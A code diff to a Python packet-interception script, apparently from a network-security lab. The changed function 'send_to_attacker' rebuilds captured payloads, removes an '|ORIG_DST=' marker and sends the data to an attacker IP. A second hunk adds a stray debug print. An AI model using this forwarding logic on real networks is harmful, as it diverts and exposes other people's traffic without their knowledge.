@@ -47,6 +47,11 @@ def send_to_attacker(packet):
     except:
         data = ''.encode("utf-8")
     if(data.decode("utf-8").find('|ORIG_DST=' + my_ips.attacker_ip) == -1):
+        if(data.decode("utf-8").find('|ORIG_DST=') != -1):
+            test_field = "|ORIG_DST="
+            tmp_data = data.decode("utf-8").partition(test_field)
+            replacement_data = tmp_data[0] + tmp_data[2]
+            data = replacement_data.encode("utf-8")
         new_packet = IP(dst=my_ips.attacker_ip)/TCP(dport=80)/Raw(load=data)
 
         send_to_router(new_packet)
@@ -130,6 +135,7 @@ def get_packet_destination(data):
 #---
 
 def log_packet(packet):
+    print('help me!')
     if packet.show() is None:
         print('logging packet')
         f = open('log_file.txt', 'a')
